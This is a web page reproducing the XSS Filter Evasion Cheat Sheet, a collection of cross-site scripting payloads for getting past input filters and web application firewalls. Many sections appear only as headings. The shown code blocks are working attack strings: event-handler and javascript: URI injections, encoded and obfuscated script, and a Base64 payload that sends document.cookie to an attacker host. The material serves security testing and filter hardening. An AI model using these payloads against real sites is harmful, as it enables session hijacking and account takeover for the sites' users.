# XSS Filter Evasion Cheat Sheet[¶](#xss-filter-evasion-cheat-sheet "Permanent link")
...
### Basic XSS Test Without Filter Evasion[¶](#basic-xss-test-without-filter-evasion "Permanent link")
...
### XSS Locator (Polyglot)[¶](#xss-locator-polyglot "Permanent link")
...
### Malformed A Tags[¶](#malformed-a-tags "Permanent link")
...
### Malformed IMG Tags[¶](#malformed-img-tags "Permanent link")
...
### fromCharCode[¶](#fromcharcode "Permanent link")
...
### Default SRC Tag to Get Past Filters that Check SRC Domain[¶](#default-src-tag-to-get-past-filters-that-check-src-domain "Permanent link")
...
### Default SRC Tag by Leaving it Empty[¶](#default-src-tag-by-leaving-it-empty "Permanent link")

```
<IMG SRC= onmouseover="alert('xxs')">
```

### Default SRC Tag by Leaving it out Entirely[¶](#default-src-tag-by-leaving-it-out-entirely "Permanent link")

```
<IMG onmouseover="alert('xxs')">
```

### On Error Alert[¶](#on-error-alert "Permanent link")

```
<IMG SRC=/ onerror="alert(String.fromCharCode(88,83,83))"></img>
```

### IMG onerror and JavaScript Alert Encode[¶](#img-onerror-and-javascript-alert-encode "Permanent link")

```
<img src=x onerror="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041">
```

### Decimal HTML Character References[¶](#decimal-html-character-references "Permanent link")
...
### Decimal HTML Character References Without Trailing Semicolons[¶](#decimal-html-character-references-without-trailing-semicolons "Permanent link")
...
### Hexadecimal HTML Character References Without Trailing Semicolons[¶](#hexadecimal-html-character-references-without-trailing-semicolons "Permanent link")
...
### Embedded Tab[¶](#embedded-tab "Permanent link")
...
### Embedded Encoded Tab[¶](#embedded-encoded-tab "Permanent link")
...
### Embedded Newline to Break Up XSS[¶](#embedded-newline-to-break-up-xss "Permanent link")
...
#### Example 1: Break Up XSS Attack with Embedded Carriage Return[¶](#example-1-break-up-xss-attack-with-embedded-carriage-return "Permanent link")
...
#### Example 2: Break Up JavaScript Directive with Null[¶](#example-2-break-up-javascript-directive-with-null "Permanent link")
...
#### Example 3: Spaces and Meta Chars Before the JavaScript in Images for XSS[¶](#example-3-spaces-and-meta-chars-before-the-javascript-in-images-for-xss "Permanent link")
...
#### Example 4: Non-alpha-non-digit XSS[¶](#example-4-non-alpha-non-digit-xss "Permanent link")
...
### Extraneous Open Brackets[¶](#extraneous-open-brackets "Permanent link")
...
### No Closing Script Tags[¶](#no-closing-script-tags "Permanent link")
...
### Protocol Resolution in Script Tags[¶](#protocol-resolution-in-script-tags "Permanent link")
...
### Half Open HTML/JavaScript XSS Vector[¶](#half-open-htmljavascript-xss-vector "Permanent link")
...
### Escaping JavaScript Escapes[¶](#escaping-javascript-escapes "Permanent link")
...
### End Title Tag[¶](#end-title-tag "Permanent link")
...
#### INPUT Image[¶](#input-image "Permanent link")

```
<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">
```

#### BODY Image[¶](#body-image "Permanent link")

```
<BODY BACKGROUND="javascript:alert('XSS')">
```

#### IMG Dynsrc[¶](#img-dynsrc "Permanent link")

```
<IMG DYNSRC="javascript:alert('XSS')">
```

#### IMG Lowsrc[¶](#img-lowsrc "Permanent link")

```
<IMG LOWSRC="javascript:alert('XSS')">
```

### List-style-image[¶](#list-style-image "Permanent link")
...
### VBscript in an Image[¶](#vbscript-in-an-image "Permanent link")

```
<IMG SRC='vbscript:msgbox("XSS")'>
```

### SVG Object Tag[¶](#svg-object-tag "Permanent link")

```
<svg/onload=alert('XSS')>
```

### ECMAScript 6[¶](#ecmascript-6 "Permanent link")

```
Set.constructor`alert\x28document.domain\x29
```

### BODY Tag[¶](#body-tag "Permanent link")
...
#### Attacks Using Event Handlers[¶](#attacks-using-event-handlers "Permanent link")
...
#### BGSOUND[¶](#bgsound "Permanent link")

```
<BGSOUND SRC="javascript:alert('XSS');">
```

#### & JavaScript includes[¶](#javascript-includes "Permanent link")

```
<BR SIZE="&{alert('XSS')}">
```

#### STYLE sheet[¶](#style-sheet "Permanent link")

```
<LINK REL="stylesheet" HREF="javascript:alert('XSS');">
```

### Remote style sheet[¶](#remote-style-sheet "Permanent link")
...
#### Remote style sheet part 2[¶](#remote-style-sheet-part-2 "Permanent link")
...
#### Remote style sheet part 3[¶](#remote-style-sheet-part-3 "Permanent link")
...
### STYLE Tags that Breaks Up JavaScript for XSS[¶](#style-tags-that-breaks-up-javascript-for-xss "Permanent link")
...
### STYLE Attribute that Breaks Up an Expression[¶](#style-attribute-that-breaks-up-an-expression "Permanent link")
...
### IMG STYLE with Expressions[¶](#img-style-with-expressions "Permanent link")
...
### STYLE Tag using Background-image[¶](#style-tag-using-background-image "Permanent link")

```
<STYLE>.XSS{background-image:url("javascript:alert('XSS')");}</STYLE><A CLASS=XSS></A>
```

### STYLE Tag using Background[¶](#style-tag-using-background "Permanent link")
...
### Anonymous HTML with STYLE Attribute[¶](#anonymous-html-with-style-attribute "Permanent link")
...
### Local htc File[¶](#local-htc-file "Permanent link")
...
### US-ASCII Encoding[¶](#us-ascii-encoding "Permanent link")
...
#### META using Data[¶](#meta-using-data "Permanent link")
...
#### META with Additional URL Parameter[¶](#meta-with-additional-url-parameter "Permanent link")
...
### IFRAME Event Based[¶](#iframe-event-based "Permanent link")
...
#### DIV Background-image[¶](#div-background-image "Permanent link")

```
<DIV STYLE="background-image: url(javascript:alert('XSS'))">
```

#### DIV Background-image with Unicode XSS Exploit[¶](#div-background-image-with-unicode-xss-exploit "Permanent link")
...
#### DIV Background-image Plus Extra Characters[¶](#div-background-image-plus-extra-characters "Permanent link")
...
#### DIV Expression[¶](#div-expression "Permanent link")
...
### Downlevel-Hidden Block[¶](#downlevel-hidden-block "Permanent link")
...
### BASE Tag[¶](#base-tag "Permanent link")
...
### OBJECT Tag[¶](#object-tag "Permanent link")
...
### EMBED SVG Which Contains XSS Vector[¶](#embed-svg-which-contains-xss-vector "Permanent link")
...
### XML Data Island with CDATA Obfuscation[¶](#xml-data-island-with-cdata-obfuscation "Permanent link")
...
### Locally hosted XML with embedded JavaScript that is generated using an XML data island[¶](#locally-hosted-xml-with-embedded-javascript-that-is-generated-using-an-xml-data-island "Permanent link")
...
### HTML+TIME in XML[¶](#htmltime-in-xml "Permanent link")
...
### Assuming you can only fit in a few characters and it filters against `.js`[¶](#assuming-you-can-only-fit-in-a-few-characters-and-it-filters-against-js "Permanent link")
...
### SSI (Server Side Includes)[¶](#ssi-server-side-includes "Permanent link")
...
### IMG Embedded Commands[¶](#img-embedded-commands "Permanent link")
...
#### IMG Embedded Commands part II[¶](#img-embedded-commands-part-ii "Permanent link")
...
### Cookie Manipulation[¶](#cookie-manipulation "Permanent link")
...
### XSS Using HTML Quote Encapsulation[¶](#xss-using-html-quote-encapsulation "Permanent link")
...
### URL String Evasion[¶](#url-string-evasion "Permanent link")

The following attacks work if `http://www.google.com/` is programmatically disallowed:

#### IP Versus Hostname[¶](#ip-versus-hostname "Permanent link")

```
<A HREF="http://66.102.7.147/">XSS</A>
```

#### URL Encoding[¶](#url-encoding "Permanent link")

```
<A HREF="http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D">XSS</A>
```

#### DWORD Encoding[¶](#dword-encoding "Permanent link")
...
#### Hex Encoding[¶](#hex-encoding "Permanent link")
...
#### Octal Encoding[¶](#octal-encoding "Permanent link")
...
#### Base64 Encoding[¶](#base64-encoding "Permanent link")

```
<img onload="eval(atob('ZG9jdW1lbnQubG9jYXRpb249Imh0dHA6Ly9saXN0ZXJuSVAvIitkb2N1bWVudC5jb29raWU='))">
```

#### Mixed Encoding[¶](#mixed-encoding "Permanent link")
...
#### Protocol Resolution Bypass[¶](#protocol-resolution-bypass "Permanent link")
...
#### Removing CNAMEs[¶](#removing-cnames "Permanent link")
...
#### JavaScript Link Location[¶](#javascript-link-location "Permanent link")

```
<A HREF="javascript:document.location='http://www.google.com/'">XSS</A>
```

#### Content Replace as Attack Vector[¶](#content-replace-as-attack-vector "Permanent link")
...
### Assisting XSS with HTTP Parameter Pollution[¶](#assisting-xss-with-http-parameter-pollution "Permanent link")
...
#### Content Page Source Code[¶](#content-page-source-code "Permanent link")

```
a href="/Share?content_type=1&title=<%=Encode.forHtmlAttribute(untrusted content title)%>">Share</a>
```

#### Share Page Source Code[¶](#share-page-source-code "Permanent link")
...
#### Content Page Output[¶](#content-page-output "Permanent link")
...
#### Share Page Output[¶](#share-page-output "Permanent link")
...
## Character Escape Sequences[¶](#character-escape-sequences "Permanent link")
...
## Methods to Bypass WAF – Cross-Site Scripting[¶](#methods-to-bypass-waf-cross-site-scripting "Permanent link")

### General issues[¶](#general-issues "Permanent link")

#### Stored XSS[¶](#stored-xss "Permanent link")

If an attacker managed to push XSS through the filter, WAF wouldn’t be able to prevent the attack conduction.

#### Reflected XSS in JavaScript[¶](#reflected-xss-in-javascript "Permanent link")
...
#### DOM-based XSS[¶](#dom-based-xss "Permanent link")
...
#### XSS via request Redirection[¶](#xss-via-request-redirection "Permanent link")
...
### WAF ByPass Strings for XSS[¶](#waf-bypass-strings-for-xss "Permanent link")
...
### Filter Bypass Alert Obfuscation[¶](#filter-bypass-alert-obfuscation "Permanent link")
